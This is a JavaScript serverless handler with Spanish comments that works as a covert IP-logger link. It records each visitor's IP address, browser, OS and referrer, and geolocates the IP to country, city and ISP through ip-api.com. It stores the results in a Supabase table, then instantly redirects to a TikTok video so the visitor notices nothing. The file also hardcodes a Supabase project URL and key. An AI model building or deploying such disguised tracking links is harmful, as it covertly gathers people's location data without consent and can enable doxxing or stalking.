import { createClient } from '@supabase/supabase-js';

const SUPABASE_URL = 'https://uzbzkbqwtptefqcyqiee.supabase.co';
const SUPABASE_KEY = 'sb_publishable_ClkzoEEKBd5CXE3Nw7b2RQ_xvOQoRDc';
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

export default async function handler(req, res) {
    // 1. Obtener la IP real del visitante
    const rawIp = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || '';
    const cleanIp = rawIp.replace(/^::ffff:/, ''); // Limpiar formato IPv6 emulado

    const userAgent = req.headers['user-agent'] || '';
    const referidor = req.headers['referer'] || 'Directo / Desconocido';

    // Parseo básico de User-Agent
    const isMobile = /mobile|android|iphone/i.test(userAgent);
    const dispositivo = isMobile ? 'Móvil' : 'Escritorio';

    let sistemaOperativo = 'Desconocido';
    if (/windows/i.test(userAgent)) sistemaOperativo = 'Windows';
    else if (/macintosh|mac os/i.test(userAgent)) sistemaOperativo = 'macOS';
    else if (/iphone|ipad/i.test(userAgent)) sistemaOperativo = 'iOS';
    else if (/android/i.test(userAgent)) sistemaOperativo = 'Android';
    else if (/linux/i.test(userAgent)) sistemaOperativo = 'Linux';

    let navegador = 'Desconocido';
    if (/chrome/i.test(userAgent) && !/edg/i.test(userAgent)) navegador = 'Chrome';
    else if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) navegador = 'Safari';
    else if (/firefox/i.test(userAgent)) navegador = 'Firefox';
    else if (/edg/i.test(userAgent)) navegador = 'Edge';

    // 2. Consultar API de geolocalización gratuita
    let pais = 'Desconocido';
    let ciudad = 'Desconocida';
    let proveedor = 'Desconocido';

    if (cleanIp && cleanIp !== '127.0.0.1' && cleanIp !== '::1') {
        try {
            const geoRes = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp`);
            const geoData = await geoRes.json();
            if (geoData.status === 'success') {
                pais = geoData.country || 'Desconocido';
                ciudad = geoData.city || 'Desconocida';
                proveedor = geoData.isp || 'Desconocido';
            }
        } catch (e) {
            console.error('Error al consultar geolocalización:', e);
        }
    }

    // 3. Guardar en Supabase en segundo plano
    await supabase.from('registros').insert([
        {
            ip: cleanIp,
            pais: pais,
            ciudad: ciudad,
            proveedor: proveedor,
            dispositivo: dispositivo,
            sistema_operativo: sistemaOperativo,
            navegador: navegador,
            referidor: referidor
        }
    ]);

    // 4. Redirección HTTP 302 ultrarrápida (Cambia Google por tu enlace destino final)
    const URL_DESTINO = 'https://vt.tiktok.com/ZSpu6MNkr/'; 
    res.setHeader('Location', URL_DESTINO);
    res.status(302).end();
}